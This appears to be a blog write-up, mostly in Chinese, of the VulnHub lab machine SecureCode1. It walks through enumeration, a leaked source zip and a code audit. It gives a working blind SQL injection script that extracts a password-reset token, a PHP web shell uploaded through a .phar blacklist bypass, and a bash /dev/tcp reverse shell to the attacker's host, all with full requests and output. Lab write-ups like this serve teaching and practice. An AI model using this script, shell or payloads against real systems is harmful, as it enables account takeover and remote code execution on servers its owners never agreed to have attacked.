---
title: VulnHub-SecureCode1
author: AmtuOrRF
date: 2022-03-03
categories: [vulnhub]
tags: [vulnhub]
---
*2022 年 3 月 3 日，星期四*
### Description
> OSWE-like machine

### Table of Content
- [nmap](#nmap)
- [sql-injection-python-script](#sql-injection-python-script)
- [利用 gobuster 爆破出网站源代码.zip](#利用-gobuster-爆破出网站源代码.zip)
- [upload-php-file](#upload-php-file)




### nmap
```bash
# nmap -sV -p- -sC 172.16.1.65 -oN nmap
# Nmap 7.91 scan initiated Mon Feb 28 06:21:17 2022 as: nmap -sV -p- -sC -oN nmap 172.16.1.65
Nmap scan report for 172.16.1.65
Host is up (0.0020s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/login/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Coming Soon 2
MAC Address: 08:00:27:07:03:BD (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 28 06:27:38 2022 -- 1 IP address (1 host up) scanned in 380.87 seconds
```

### 利用gobuster爆破出网站源代码.zip

web 页面提示 `Our website is under construction!`,`我们的网站正在建设中!`.

使用gobuster
```bash
$ gobuster dir -u http://172.16.1.65/ -x zip,php,html -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.65/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
2022/03/02 01:57:40 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3650]
/login                (Status: 301) [Size: 310] [--> http://172.16.1.65/login/]
/profile              (Status: 301) [Size: 312] [--> http://172.16.1.65/profile/]
/users                (Status: 301) [Size: 310] [--> http://172.16.1.65/users/]  
/item                 (Status: 301) [Size: 309] [--> http://172.16.1.65/item/]   
/include              (Status: 301) [Size: 312] [--> http://172.16.1.65/include/]
/asset                (Status: 301) [Size: 310] [--> http://172.16.1.65/asset/]  
/source_code.zip      (Status: 200) [Size: 5275298]
```

 发现 `source_code.zip`
 
 使用`wget`下载文件
 
 ```shell
 $ wget http://172.16.1.65/source_code.zip
 ```
 
 接下来就是代码审计了
 
`/item/`目录下的文件存在以下内容的都需要登录才能访问

```php
include "../include/isAuthenticated.php";
```

而这个文件没有，而且存在sql injection

 `/item/viewItem.php` 内容
 
 ```php
<?php

// Still under development
session_start();
ini_set("display_errors", 0);
include "../include/connection.php";

// see if user is authenticated, if not then redirect to login page
if($_SESSION['id_level'] != 1){

    $_SESSION['danger'] = " You not have access to visit that page";
    header("Location: ../login/login.php");

}
// only for users with level 1 (admins)
// prevent SQL injection
$id = mysqli_real_escape_string($conn, $_GET['id']);
$data = mysqli_query($conn, "SELECT * FROM item WHERE id = $id");
$result = mysqli_fetch_array($data);

//var_dump($result);
if(isset($result['id'])){
    http_response_code(404);
}


?>
```

默认访问 302跳转到 `../login/login.php`
 
 下面的代码大概就GET传进去一个id 如果sql 语句查询到结果则返回状态码404
 
 
 > 接下来的sql注入结果主要看返回状态码
 
```shell
$ curl "http://172.16.1.65/item/viewItem.php?id=1" -v
# 响应状态码 404
 
$ curl "http://172.16.1.65/item/viewItem.php?id=-1" -v
# 响应状态码 302
 
$ curl "http://172.16.1.65/item/viewItem.php?id=-1+or+1=1" -v
# 响应状态码 404
 
$ curl "http://172.16.1.65/item/viewItem.php?id=-1+or+1=2" -v
# 响应状态码 404
```

> 经过测试验证，SQL 注入无疑
> 接下使用slqmap 或者写脚本

# sql-injection-python-script

```python
import requests
import binascii

host = '172.16.1.65'
target = f'http://{host}/item/viewItem.php?id='
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def exp(pay):
    r = '' 
    for i in range(1,100):
        low = 32
        high = 127
        mid = (low + high) // 2
        while(low < high):

            payload = f'20+or+ascii(substr(({pay}),{i},1))>{mid}'

            url = target + payload
            #print(url)
			#v1 = requests.get(url=url,headers=headers,proxies={'http':'http://127.0.0.1:8080'},allow_redirects=False)
            v1 = requests.get(url=url,headers=headers,allow_redirects=False)
			

            if (v1.status_code==404):
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 32 or mid == 127:
            break
        r += chr(mid)
        print(r)
    return r


pay = 'database()'
exp(pay)
# 查看当前数据库
# 结果：hackshop


pay = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
exp(pay)
# 查看当前数据库的表单
# 结果：item,level,user


v3 = str(binascii.hexlify(b'user'))[2:-1]
pay = f"select group_concat(column_name) from information_schema.columns where table_name=0x{v3}"
exp(pay)
# 查看当前数据库 user 的字段
# 结果：id,username,password,email,gender,id_level,token,Host,User,Select_priv,Insert_priv,Update_priv,Dele

pay = "select group_concat(token) from user"
exp(pay)
# 查看token字段
```

一开始 使用sql注入得到的密码登录不成功
得到的密码是密文，而验证时需要MD5加密后的，这样肯定不能登录

`unaccessable_until_you_change_me,unaccessable_until_you_change_me`

 生成token的代码在`/login/resetPassword.php`
 
```php
function generateToken(){
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < 15; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
# 生成token的随机性太大，爆破当然不太现实
```

### Exploitation
讲一下大概思路
> 利用重置密码功能 `http://172.16.1.65/login/resetPassword.php`
> 用户名 `admin` 然后 生成一个token 它会存放到数据库里，然后我们利用sql注入查看token
> 有了token 就好办多了

这里的一系列操作我就使用`curl`

```shell

# 提交要重置密码的用户名，然后数据库里就多了token
curl -XPOST -d "username=admin" "http://172.16.1.65/login/resetPassword.php"
```
```shell
# 在使用上面的脚本跑出token
$ python3 t.py 
9
90
90v
90vw
90vwe
90vwel
90vwelD
90vwelDS
90vwelDSu
90vwelDSua
90vwelDSuac
90vwelDSuacG
90vwelDSuacG7
90vwelDSuacG7I
90vwelDSuacG7Ix
90vwelDSuacG7Ix,

# ToKen:`90vwelDSuacG7Ix`
```
```bash
$ curl -XPOST -d "token=90vwelDSuacG7Ix&password=newpass" http://172.16.1.65/login/doChangePassword.php
# Ok 密码重置成功

# 再次使用脚本查看密码
pay = "select group_concat(password) from user"
exp(pay)


# 结果：
# e6053eb8d35e02ae40beeeacef203c1a,unaccessable_until_you_change_me


$# echo -n "newpass" |openssl md5
(stdin)= e6053eb8d35e02ae40beeeacef203c1a

# 结果意料之中

```

密码重置成功

`admin`:`newpass`

进行后台登录，在后台管理页面得到`FLAG1`

```shell
FLAG1: 0410e2bd77f66dc9a567ab00aa29599cd 
```


### upload-php-file
> 上传点
> 进入后台->item->顺便编辑一个

上传文件黑名单

`"php", "phtml", "shtml", "cgi", "pl", "php3", "php4", "php5", "php6"`

我们使用`.phar`后缀进行上传

POST 上传数据
> 如果需要复制使用，需要你修改`Cookie`和`HOST`

```bash
POST /item/updateItem.php HTTP/1.1
Host: 172.16.1.65
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------40674686325473066152319269900
Content-Length: 939
Connection: close
Referer: http://172.16.1.65/item/editItem.php?id=1
Cookie: PHPSESSID=k39ut87e25fljlr8enuqjj8p97
Upgrade-Insecure-Requests: 1

-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="id"

1
-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="id_user"

1
-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="name"

Raspery Pi 4
-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="image"; filename="mn.phar"
Content-Type: image/jpeg

<?php system($_GET['cmd'])?>
-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="description"

Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B
-----------------------------40674686325473066152319269900
Content-Disposition: form-data; name="price"

92
-----------------------------40674686325473066152319269900--
```


上传成功后访问`http://172.16.1.65/item/image/mn.phar?cmd=pwd`

接下来反弹`shell`

Kali:172.16.1.52

```shell
$ nc -lvp 123
```

然后访问

```bash
http://172.16.1.65/item/image/mn.phar?cmd=bash -c "bash -i >%26 /dev/tcp/172.16.1.52/123 0>%261"
```

kali

```bash
root@kali:/opt# nc -lvp 123
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::123
Ncat: Listening on 0.0.0.0:123
Ncat: Connection from 172.16.1.65.
Ncat: Connection from 172.16.1.65:42632.
bash: cannot set terminal process group (592): Inappropriate ioctl for device
bash: no job control in this shell

www-data@secure:/var/www/html/item/image$ which python3
/usr/bin/python3
www-data@secure:/var/www/html/item/image$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@secure:/var/www/html/item/image$ tty
/dev/pts/0
www-data@secure:/var/www/html/item/image$ cd /var/www/
www-data@secure:/var/www/$ ls
flag2.txt  html
www-data@secure:/var/www$ cat flag2.txt
legendary

FLAG2: 3599f5effdb3ed07d9a90a4ed19d13ad4

www-data@secure:/var/www$
```

`FLAG2`:`FLAG2: 3599f5effdb3ed07d9a90a4ed19d13ad4`
